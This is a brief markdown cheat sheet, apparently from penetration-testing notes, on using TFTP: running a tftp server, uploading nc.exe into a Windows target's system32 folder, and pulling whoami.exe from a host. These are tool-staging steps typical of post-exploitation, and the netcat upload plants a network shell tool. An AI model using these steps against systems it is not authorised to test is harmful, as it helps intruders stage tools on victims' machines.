# tftp

## upload file
```bash
tftp $IP
```
in tftp prompt
```
mode binary
put nc.exe c:\windows\system32\nc.exe
```

## start daemon (folder /var/tftp)
```bash
atftpd --daemon --port 69 /var/tftp
```

## transfer Files
```bash
tftp -i 192.168.0.1 GET whoami.exe
```
